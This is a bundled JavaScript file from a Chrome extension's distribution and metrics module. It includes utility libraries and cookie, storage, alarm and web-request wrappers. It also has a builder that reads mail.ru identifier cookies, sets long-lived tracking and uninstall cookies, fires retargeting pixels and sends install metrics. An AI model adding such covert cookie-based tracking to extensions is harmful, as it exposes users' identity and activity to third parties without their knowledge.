function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

/** Used as references for various `Number` constants. */
var NAN = 0 / 0;

/** Used to match leading and trailing whitespace. */
var reTrim = /^\s+|\s+$/g;

/** Used to detect bad signed hexadecimal string values. */
var reIsBadHex = /^[-+]0x[0-9a-f]+$/i;

/** Used to detect binary string values. */
var reIsBinary = /^0b[01]+$/i;

/** Used to detect octal string values. */
var reIsOctal = /^0o[0-7]+$/i;

/** Built-in method references without a dependency on `root`. */
var freeParseInt = parseInt;

/**
 * Converts `value` to a number.
 *
 * @static
 * @memberOf _
 * @since 4.0.0
 * @category Lang
 * @param {*} value The value to process.
 * @returns {number} Returns the number.
 * @example
 *
 * _.toNumber(3);
 * // => 3
 *
 * _.toNumber(Number.MIN_VALUE);
 * // => 5e-324
 *
 * _.toNumber(Infinity);
 * // => Infinity
 *
 * _.toNumber('3');
 * // => 3
 */
function toNumber(value) {
  if (typeof value == 'number') {
    return value;
  }
  if ((0, _isSymbol2.default)(value)) {
    return NAN;
  }
  if ((0, _isObject2.default)(value)) {
    var other = (0, _isFunction2.default)(value.valueOf) ? value.valueOf() : value;
    value = (0, _isObject2.default)(other) ? other + '' : other;
  }
  if (typeof value != 'string') {
    return value === 0 ? value : +value;
  }
  value = value.replace(reTrim, '');
  var isBinary = reIsBinary.test(value);
  return isBinary || reIsOctal.test(value) ? freeParseInt(value.slice(2), isBinary ? 2 : 8) : reIsBadHex.test(value) ? NAN : +value;
}

exports.default = toNumber;

},{"./isFunction":25,"./isObject":27,"./isSymbol":30}],36:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
    value: true
});
exports.default = whilst;

var _noop = require('lodash-es/noop');

var _noop2 = _interopRequireDefault(_noop);

var _rest = require('lodash-es/rest');

var _rest2 = _interopRequireDefault(_rest);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function whilst(test, iteratee, cb) {
    cb = cb || _noop2.default;
    if (!test()) return cb(null);
    var next = (0, _rest2.default)(function (err, args) {
        if (err) return cb(err);
        if (test.apply(this, args)) return iteratee(next);
        cb.apply(null, [null].concat(args));
    });
    iteratee(next);
}

},{"lodash-es/noop":32,"lodash-es/rest":33}],37:[function(require,module,exports){
'use strict';

var isObj = require('is-obj');
var hasOwnProperty = Object.prototype.hasOwnProperty;
var propIsEnumerable = Object.prototype.propertyIsEnumerable;

function toObject(val) {
	if (val === null || val === undefined) {
		throw new TypeError('Sources cannot be null or undefined');
	}

	return Object(val);
}

function assignKey(to, from, key) {
	var val = from[key];

	if (val === undefined || val === null) {
		return;
	}

	if (hasOwnProperty.call(to, key)) {
		if (to[key] === undefined || to[key] === null) {
			throw new TypeError('Cannot convert undefined or null to object (' + key + ')');
		}
	}

	if (!hasOwnProperty.call(to, key) || !isObj(val)) {
		to[key] = val;
	} else {
		to[key] = assign(Object(to[key]), from[key]);
	}
}

function assign(to, from) {
	if (to === from) {
		return to;
	}

	from = Object(from);

	for (var key in from) {
		if (hasOwnProperty.call(from, key)) {
			assignKey(to, from, key);
		}
	}

	if (Object.getOwnPropertySymbols) {
		var symbols = Object.getOwnPropertySymbols(from);

		for (var i = 0; i < symbols.length; i++) {
			if (propIsEnumerable.call(from, symbols[i])) {
				assignKey(to, from, symbols[i]);
			}
		}
	}

	return to;
}

module.exports = function deepAssign(target) {
	target = toObject(target);

	for (var s = 1; s < arguments.length; s++) {
		assign(target, arguments[s]);
	}

	return target;
};

},{"is-obj":38}],38:[function(require,module,exports){
'use strict';

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

module.exports = function (x) {
	var type = typeof x === 'undefined' ? 'undefined' : _typeof(x);
	return x !== null && (type === 'object' || type === 'function');
};

},{}],39:[function(require,module,exports){
'use strict';

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

(function (root, factory) {
  if ((typeof exports === 'undefined' ? 'undefined' : _typeof(exports)) === 'object') {
    module.exports = factory();
  } else if (typeof define === 'function' && define.amd) {
    define([], factory);
  } else {
    root.urltemplate = factory();
  }
})(undefined, function () {
  /**
   * @constructor
   */
  function UrlTemplate() {}

  /**
   * @private
   * @param {string} str
   * @return {string}
   */
  UrlTemplate.prototype.encodeReserved = function (str) {
    return str.split(/(%[0-9A-Fa-f]{2})/g).map(function (part) {
      if (!/%[0-9A-Fa-f]/.test(part)) {
        part = encodeURI(part);
      }
      return part;
    }).join('');
  };

  /**
   * @private
   * @param {string} operator
   * @param {string} value
   * @param {string} key
   * @return {string}
   */
  UrlTemplate.prototype.encodeValue = function (operator, value, key) {
    value = operator === '+' || operator === '#' ? this.encodeReserved(value) : encodeURIComponent(value);

    if (key) {
      return encodeURIComponent(key) + '=' + value;
    } else {
      return value;
    }
  };

  /**
   * @private
   * @param {*} value
   * @return {boolean}
   */
  UrlTemplate.prototype.isDefined = function (value) {
    return value !== undefined && value !== null;
  };

  /**
   * @private
   * @param {string}
   * @return {boolean}
   */
  UrlTemplate.prototype.isKeyOperator = function (operator) {
    return operator === ';' || operator === '&' || operator === '?';
  };

  /**
   * @private
   * @param {Object} context
   * @param {string} operator
   * @param {string} key
   * @param {string} modifier
   */
  UrlTemplate.prototype.getValues = function (context, operator, key, modifier) {
    var value = context[key],
        result = [];

    if (this.isDefined(value) && value !== '') {
      if (typeof value === 'string' || typeof value === 'number' || typeof value === 'boolean') {
        value = value.toString();

        if (modifier && modifier !== '*') {
          value = value.substring(0, parseInt(modifier, 10));
        }

        result.push(this.encodeValue(operator, value, this.isKeyOperator(operator) ? key : null));
      } else {
        if (modifier === '*') {
          if (Array.isArray(value)) {
            value.filter(this.isDefined).forEach(function (value) {
              result.push(this.encodeValue(operator, value, this.isKeyOperator(operator) ? key : null));
            }, this);
          } else {
            Object.keys(value).forEach(function (k) {
              if (this.isDefined(value[k])) {
                result.push(this.encodeValue(operator, value[k], k));
              }
            }, this);
          }
        } else {
          var tmp = [];

          if (Array.isArray(value)) {
            value.filter(this.isDefined).forEach(function (value) {
              tmp.push(this.encodeValue(operator, value));
            }, this);
          } else {
            Object.keys(value).forEach(function (k) {
              if (this.isDefined(value[k])) {
                tmp.push(encodeURIComponent(k));
                tmp.push(this.encodeValue(operator, value[k].toString()));
              }
            }, this);
          }

          if (this.isKeyOperator(operator)) {
            result.push(encodeURIComponent(key) + '=' + tmp.join(','));
          } else if (tmp.length !== 0) {
            result.push(tmp.join(','));
          }
        }
      }
    } else {
      if (operator === ';') {
        result.push(encodeURIComponent(key));
      } else if (value === '' && (operator === '&' || operator === '?')) {
        result.push(encodeURIComponent(key) + '=');
      } else if (value === '') {
        result.push('');
      }
    }
    return result;
  };

  /**
   * @param {string} template
   * @return {function(Object):string}
   */
  UrlTemplate.prototype.parse = function (template) {
    var that = this;
    var operators = ['+', '#', '.', '/', ';', '?', '&'];

    return {
      expand: function expand(context) {
        return template.replace(/\{([^\{\}]+)\}|([^\{\}]+)/g, function (_, expression, literal) {
          if (expression) {
            var operator = null,
                values = [];

            if (operators.indexOf(expression.charAt(0)) !== -1) {
              operator = expression.charAt(0);
              expression = expression.substr(1);
            }

            expression.split(/,/g).forEach(function (variable) {
              var tmp = /([^:\*]*)(?::(\d+)|(\*))?/.exec(variable);
              values.push.apply(values, that.getValues(context, operator, tmp[1], tmp[2] || tmp[3]));
            });

            if (operator && operator !== '+') {
              var separator = ',';

              if (operator === '?') {
                separator = '&';
              } else if (operator !== '#') {
                separator = operator;
              }
              return (values.length !== 0 ? operator : '') + values.join(separator);
            } else {
              return values.join(',');
            }
          } else {
            return that.encodeReserved(literal);
          }
        });
      }
    };
  };

  return new UrlTemplate();
});

},{}],40:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _chromeUtils = require('../utils/chrome-utils');

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var namespace = function namespace() {
  return chrome.cookies;
};

var CookieFacade = function () {
  function CookieFacade(url, name) {
    var options = arguments.length <= 2 || arguments[2] === undefined ? {} : arguments[2];

    _classCallCheck(this, CookieFacade);

    this.__url = url;
    this.__name = name;
    this.__baseOptions = options;
  }

  _createClass(CookieFacade, [{
    key: 'setCookie',
    value: function setCookie(value) {
      var options = _extends({ url: this.__url, name: this.__name, value: value }, this.__baseOptions);
      return (0, _chromeUtils.wrapChromeApi)(namespace(), 'set', options);
    }
  }, {
    key: 'getCookie',
    value: function getCookie() {
      return (0, _chromeUtils.wrapChromeApi)(namespace(), 'get', { url: this.__url, name: this.__name });
    }
  }]);

  return CookieFacade;
}();

exports.default = CookieFacade;

},{"../utils/chrome-utils":99}],41:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
var details = chrome.app.getDetails();
exports.default = details;

},{}],42:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var LocalStorageFacade = function () {
  function LocalStorageFacade(key) {
    _classCallCheck(this, LocalStorageFacade);

    this.__key = key;
  }

  _createClass(LocalStorageFacade, [{
    key: 'hasData',
    value: function hasData() {
      var _this = this;

      return new Promise(function (resolve) {
        var data = localStorage.getItem(_this.__key);
        resolve(data !== null);
      });
    }
  }, {
    key: 'setData',
    value: function setData(data) {
      var _this2 = this;

      console.info('Saving data to storage under key', this.__key, ':', data);
      return new Promise(function (resolve) {
        localStorage.setItem(_this2.__key, JSON.stringify(data));
        resolve(data);
      });
    }
  }, {
    key: 'getData',
    value: function getData() {
      var _this3 = this;

      return new Promise(function (resolve, reject) {
        var data = localStorage.getItem(_this3.__key);
        if (data === null) {
          return reject('Data not found');
        }
        resolve(JSON.parse(data));
      });
    }
  }]);

  return LocalStorageFacade;
}();

exports.default = LocalStorageFacade;

},{}],43:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _cookieFacade = require('./cookie-facade');

var _cookieFacade2 = _interopRequireDefault(_cookieFacade);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var MultiCookieReader = function () {
  function MultiCookieReader() {
    _classCallCheck(this, MultiCookieReader);

    for (var _len = arguments.length, pairs = Array(_len), _key = 0; _key < _len; _key++) {
      pairs[_key] = arguments[_key];
    }

    this.__facades = pairs.map(function (_ref) {
      var url = _ref.url;
      var name = _ref.name;
      return new _cookieFacade2.default(url, name);
    });
  }

  _createClass(MultiCookieReader, [{
    key: 'getAllCookies',
    value: function getAllCookies() {
      return Promise.all(this.__facades.map(function (facade) {
        return facade.getCookie();
      }));
    }
  }]);

  return MultiCookieReader;
}();

exports.default = MultiCookieReader;

},{"./cookie-facade":40}],44:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

exports.default = function () {
  return (0, _chromeUtils.wrapChromeApi)(namespace(), 'getAll');
};

var _chromeUtils = require('../utils/chrome-utils');

var namespace = function namespace() {
  return chrome.permissions;
};

},{"../utils/chrome-utils":99}],45:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var namespace = function namespace() {
  return chrome.alarms;
};

var ScheduleManager = function () {
  function ScheduleManager() {
    var _this = this;

    _classCallCheck(this, ScheduleManager);

    this.__schedulers = new Map();

    namespace().onAlarm.addListener(function (alarm) {
      var name = alarm.name;
      if (_this.__schedulers.has(name)) {
        var handler = _this.__schedulers.get(name);
        handler();
        _this.__clear(name);
      }
    });
  }

  _createClass(ScheduleManager, [{
    key: 'schedule',
    value: function schedule(name, when, callback) {
      console.info('Setting up alarm', name, 'at', when);
      if (this.__schedulers.has(name)) {
        return console.error('Alarm already set');
      }
      namespace().create(name, { when: when.getTime() });
      this.__schedulers.set(name, callback);
    }
  }, {
    key: '__clear',
    value: function __clear(name) {
      if (this.__schedulers.has(name)) {
        namespace().clear(name);
        this.__schedulers.delete(name);
      }
    }
  }]);

  return ScheduleManager;
}();

exports.default = ScheduleManager;

},{}],46:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _get = function get(object, property, receiver) { if (object === null) object = Function.prototype; var desc = Object.getOwnPropertyDescriptor(object, property); if (desc === undefined) { var parent = Object.getPrototypeOf(object); if (parent === null) { return undefined; } else { return get(parent, property, receiver); } } else if ("value" in desc) { return desc.value; } else { var getter = desc.get; if (getter === undefined) { return undefined; } return getter.call(receiver); } };

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

function optionsMixinFactory(options) {
  return function (Clazz) {
    return function (_Clazz) {
      _inherits(_class, _Clazz);

      function _class() {
        _classCallCheck(this, _class);

        return _possibleConstructorReturn(this, Object.getPrototypeOf(_class).apply(this, arguments));
      }

      _createClass(_class, [{
        key: 'fetch',
        value: function fetch() {
          var additionalOptions = arguments.length <= 0 || arguments[0] === undefined ? {} : arguments[0];

          return _get(Object.getPrototypeOf(_class.prototype), 'fetch', this).call(this, _extends({}, additionalOptions, options));
        }
      }]);

      return _class;
    }(Clazz);
  };
}

var CredentialsMixin = exports.CredentialsMixin = optionsMixinFactory({ credentials: 'include' });

var NoCacheMixin = exports.NoCacheMixin = optionsMixinFactory({ cache: 'no-store' });

var UrlFetcher = function () {
  function UrlFetcher(url) {
    var baseOptions = arguments.length <= 1 || arguments[1] === undefined ? {} : arguments[1];

    _classCallCheck(this, UrlFetcher);

    this.__url = url;
    this.__baseOptions = baseOptions;
  }

  _createClass(UrlFetcher, [{
    key: 'fetch',
    value: function fetch() {
      var additionalOptions = arguments.length <= 0 || arguments[0] === undefined ? {} : arguments[0];

      return window.fetch(this.__url, _extends({}, this.__baseOptions, additionalOptions));
    }
  }]);

  return UrlFetcher;
}();

exports.default = UrlFetcher;

},{}],47:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _guid = require('../utils/guid');

var _guid2 = _interopRequireDefault(_guid);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var event = function event() {
  return chrome.webRequest.onCompleted;
};

var UrlWatcher = function () {
  function UrlWatcher() {
    _classCallCheck(this, UrlWatcher);

    this.__callbacks = new Map();
  }

  _createClass(UrlWatcher, [{
    key: 'watch',
    value: function watch(urls, callback) {
      var id = (0, _guid2.default)();
      var listener = function listener(details) {
        return callback.call();
      };
      try {
        event().addListener(listener, { urls: urls, types: ['main_frame'] });
        this.__callbacks.set(id, listener);
      } catch (err) {}
      return id;
    }
  }, {
    key: 'unwatch',
    value: function unwatch(id) {
      if (this.__callbacks.has(id)) {
        var listener = this.__callbacks.get(id);
        event().removeListener(listener);
        this.__callbacks.delete(id);
      }
    }
  }, {
    key: 'unwatchAll',
    value: function unwatchAll() {
      var _this = this;

      this.__callbacks.keys().forEach(function (id) {
        return _this.unwatch(id);
      });
    }
  }]);

  return UrlWatcher;
}();

exports.default = UrlWatcher;

},{"../utils/guid":101}],48:[function(require,module,exports){
"use strict";

var config = require("../configs/dse-config.json");
module.exports = config;

},{"../configs/dse-config.json":1}],49:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});
var MAPPINGS = exports.MAPPINGS = {
  'product_type': 'kind'
};

var EXCLUDED_FIELDS = exports.EXCLUDED_FIELDS = ['fr', 'go_parameters', 'go_metric_url', 'mrds_parameters', 'mrds_metric_url', 'partner_product_online_url', 'partner_install_parameters'];

},{}],50:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

exports.default = function (permissions) {
  var extensionData = arguments.length <= 1 || arguments[1] === undefined ? {} : arguments[1];
  var additionalConfig = arguments.length <= 2 || arguments[2] === undefined ? {} : arguments[2];

  var createMetricConfiguration = function createMetricConfiguration(url, parameters, storageKey) {
    return { url: url, parameters: parameters, storage: new _localStorageFacade2.default(storageKey) };
  };

  var convertMixinsToSet = function convertMixinsToSet() {
    var items = arguments.length <= 0 || arguments[0] === undefined ? [] : arguments[0];

    var result = new Set();
    items.forEach(result.add.bind(result));
    return result;
  };

  var supportsCookies = function supportsCookies(permissions) {
    return permissions.has('cookies');
  };

  var supportsNativeMessaging = function supportsNativeMessaging(permissions) {
    return permissions.has('nativeMessaging');
  };

  var supportsNotifications = function supportsNotifications(permissions) {
    return permissions.has('notifications');
  };

  var supportsWebRequest = function supportsWebRequest(permissions) {
    return permissions.has('webRequest');
  };

  var createExtensionDataGenerator = function createExtensionDataGenerator(permissions, options, data) {
    if (options.oneLink === true && supportsCookies(permissions)) {
      var _ret = function () {
        var oneLinkUrl = 'https://mail.ru';
        var pairs = ['mr1lad', 'mr1luid', 'mr1lext', 'VID'].map(function (name) {
          return { url: oneLinkUrl, name: name };
        });
        var multiCookieReader = new (Function.prototype.bind.apply(_multiCookieReader2.default, [null].concat(_toConsumableArray(pairs))))();
        return {
          v: new _oneLinkExtensionDataGenerator2.default(multiCookieReader, data)
        };
      }();

      if ((typeof _ret === 'undefined' ? 'undefined' : _typeof(_ret)) === "object") return _ret.v;
    }
    return new _extensionDataGenerator2.default(data);
  };

  var moduleClass = _distributionCommonModule2.default;

  var options = (0, _deepAssign2.default)({}, _config2.default, additionalConfig);
  var mixinSet = convertMixinsToSet(options.mixins);
  console.info('All options:', options);
  console.info('All mixins:', mixinSet);

  var extensionDataStorage = new _localStorageFacade2.default(options.localStorage.key);
  var additionalExtensionData = _extends({}, options.extensionData, extensionData);
  var extensionDataGenerator = createExtensionDataGenerator(permissions, options, additionalExtensionData);

  extensionDataGenerator.addGenerator(new _dataGenerators2.default.LegacyDataGenerator());

  if (supportsNativeMessaging(permissions) && options.nativeMessaging) {
    var nativeMessageSender = new _nativeMessageSender2.default(options.nativeMessaging.host);
    extensionDataGenerator.addGenerator(new _dataGenerators2.default.NativeMessagingDataGenerator(_extensionDetails2.default.id, nativeMessageSender));
    if (mixinSet.has('nativeMessaging')) {
      moduleClass = _mixins2.default.NativeMessagingMixin(moduleClass, nativeMessageSender);
    }
  }

  if (supportsCookies(permissions) && options.shortTermCookie) {
    var shortTermCookieFacade = new _cookieFacade2.default(options.shortTermCookie.url, options.shortTermCookie.name);
    extensionDataGenerator.addGenerator(new _dataGenerators2.default.CookieDataGenerator(shortTermCookieFacade));
  }

  extensionDataGenerator.addGenerator(new _dataGenerators2.default.DefaultDataGenerator());

  var mrdsSender = options.metrics ? new _metricSenders2.default.MetricSender(options.metrics.mrds.url, options.metrics.mrds.parameters) : new _metricSenders2.default.DummyMetricSender();

  if (mixinSet.has('mrdsMetrics')) {
    moduleClass = _mixins2.default.MrdsMetricsMixin(moduleClass, mrdsSender);
  }

  if (supportsNotifications(permissions) && mixinSet.has('notifications')) {
    moduleClass = _mixins2.default.NotificationsMixin(moduleClass);
  }

  var module = new moduleClass(extensionDataGenerator, extensionDataStorage);
  var scheduler = new _scheduleManager2.default();

  if (options.metrics) {
    var metricManager = new _metricManager2.default();
    var metrics = options.metrics;
    var mrdsMetricConfiguration = createMetricConfiguration(metrics.mrds.url, metrics.mrds.parameters, 'metric_state_mrds_metric');
    var goMetricConfiguration = createMetricConfiguration(metrics.go.url, metrics.go.parameters, 'metric_state_go_metric');
    var partnerMetricConfiguration = createMetricConfiguration(null, metrics.partnerInstall.parameters, 'metric_state_installPartnerMetric');

    module.registerPlugin(new _plugins2.default.OnlineMetricsPlugin(metricManager, scheduler, mrdsMetricConfiguration, goMetricConfiguration, partnerMetricConfiguration));
  }

  if (supportsCookies(permissions) && options.longTermCookie) {
    var expirationDate = new Date();
    expirationDate.setDate(expirationDate.getDate() + 7);
    var cookieOptions = { expirationDate: expirationDate.getTime() / 1000 };
    var longTermCookieFacade = new _cookieFacade2.default(options.longTermCookie.url, options.longTermCookie.name, cookieOptions);

    module.registerPlugin(new _plugins2.default.LongTermCookiePlugin(longTermCookieFacade, scheduler));
  }

  if (options.rbTargeting) {
    module.registerPlugin(new _plugins2.default.PixelFetcherPlugin(options.rbTargeting.url, scheduler));
  }

  if (supportsCookies(permissions) && options.uninstall) {
    var cookieName = 'uninstall_' + (0, _guid2.default)();
    var uninstallCookieFacade = new _cookieFacade2.default(options.uninstall.url, cookieName);
    module.registerPlugin(new _plugins2.default.UninstallUrlPlugin(options.uninstall.url, cookieName, uninstallCookieFacade));
  }

  if (supportsWebRequest(permissions) && supportsNotifications(permissions) && options.notifications) {
    _notificationHandlerRegistry2.default.init();

    var FetcherClass = (0, _urlFetcher.CredentialsMixin)(_urlFetcher2.default);
    var urlFetcher = new FetcherClass(options.notifications.configUrl + '?rnd=' + Date.now().toString());
    var notificationHistoryStorage = new _localStorageFacade2.default(options.notifications.storageKey || 'notifications_history');
    var notificationConfigService = new _notificationConfigService2.default(urlFetcher);
    var notificationHistoryManager = new _notificationHistoryManager2.default(notificationHistoryStorage);
    var urlWatcher = new _urlWatcher2.default();

    module.registerPlugin(new _plugins2.default.NotificationsPlugin(notificationConfigService, notificationHistoryManager, scheduler, urlWatcher, mrdsSender));
  }

  return module;
};

var _deepAssign = require('deep-assign');

var _deepAssign2 = _interopRequireDefault(_deepAssign);

var _config = require('../config');

var _config2 = _interopRequireDefault(_config);

var _extensionDetails = require('../common/extension-details');

var _extensionDetails2 = _interopRequireDefault(_extensionDetails);

var _dataGenerators = require('../modules/data-generators');

var _dataGenerators2 = _interopRequireDefault(_dataGenerators);

var _metricSenders = require('../modules/metric-senders');

var _metricSenders2 = _interopRequireDefault(_metricSenders);

var _plugins = require('../plugins');

var _plugins2 = _interopRequireDefault(_plugins);

var _mixins = require('../mixins');

var _mixins2 = _interopRequireDefault(_mixins);

var _guid = require('../utils/guid');

var _guid2 = _interopRequireDefault(_guid);

var _localStorageFacade = require('../common/local-storage-facade');

var _localStorageFacade2 = _interopRequireDefault(_localStorageFacade);

var _cookieFacade = require('../common/cookie-facade');

var _cookieFacade2 = _interopRequireDefault(_cookieFacade);

var _multiCookieReader = require('../common/multi-cookie-reader');

var _multiCookieReader2 = _interopRequireDefault(_multiCookieReader);

var _scheduleManager = require('../common/schedule-manager');

var _scheduleManager2 = _interopRequireDefault(_scheduleManager);

var _urlFetcher = require('../common/url-fetcher');

var _urlFetcher2 = _interopRequireDefault(_urlFetcher);

var _urlWatcher = require('../common/url-watcher');

var _urlWatcher2 = _interopRequireDefault(_urlWatcher);

var _metricManager = require('../modules/metric-manager');

var _metricManager2 = _interopRequireDefault(_metricManager);

var _oneLinkExtensionDataGenerator = require('../modules/one-link-extension-data-generator');

var _oneLinkExtensionDataGenerator2 = _interopRequireDefault(_oneLinkExtensionDataGenerator);

var _extensionDataGenerator = require('../modules/extension-data-generator');

var _extensionDataGenerator2 = _interopRequireDefault(_extensionDataGenerator);

var _nativeMessageSender = require('../modules/native-message-sender');

var _nativeMessageSender2 = _interopRequireDefault(_nativeMessageSender);

var _notificationHandlerRegistry = require('../modules/notifications/notification-handler-registry');

var _notificationHandlerRegistry2 = _interopRequireDefault(_notificationHandlerRegistry);

var _notificationConfigService = require('../modules/notifications/notification-config-service');

var _notificationConfigService2 = _interopRequireDefault(_notificationConfigService);

var _notificationHistoryManager = require('../modules/notifications/notification-history-manager');

var _notificationHistoryManager2 = _interopRequireDefault(_notificationHistoryManager);

var _distributionCommonModule = require('../modules/distribution-common-module');

var _distributionCommonModule2 = _interopRequireDefault(_distributionCommonModule);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

;

},{"../common/cookie-facade":40,"../common/extension-details":41,"../common/local-storage-facade":42,"../common/multi-cookie-reader":43,"../common/schedule-manager":45,"../common/url-fetcher":46,"../common/url-watcher":47,"../config":48,"../mixins":53,"../modules/data-generators":60,"../modules/distribution-common-module":63,"../modules/extension-data-generator":64,"../modules/metric-manager":65,"../modules/metric-senders":68,"../modules/native-message-sender":72,"../modules/notifications/notification-config-service":79,"../modules/notifications/notification-handler-registry":80,"../modules/notifications/notification-history-manager":81,"../modules/one-link-extension-data-generator":91,"../plugins":93,"../utils/guid":101,"deep-assign":37}],51:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

exports.default = function () {
  var extensionData = arguments.length <= 0 || arguments[0] === undefined ? {} : arguments[0];
  var additionalConfig = arguments.length <= 1 || arguments[1] === undefined ? {} : arguments[1];

  return (0, _permissionChecker2.default)().then(function (_ref) {
    var permissions = _ref.permissions;
    var origins = _ref.origins;

    var permissionSet = (0, _paramUtils.arrayToSet)([].concat(_toConsumableArray(permissions), _toConsumableArray(origins)));
    return (0, _distributionModuleBuilder2.default)(permissionSet, extensionData, additionalConfig);
  });
};

var _permissionChecker = require('../common/permission-checker');

var _permissionChecker2 = _interopRequireDefault(_permissionChecker);

var _paramUtils = require('../utils/param-utils');

var _distributionModuleBuilder = require('./distribution-module-builder');

var _distributionModuleBuilder2 = _interopRequireDefault(_distributionModuleBuilder);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

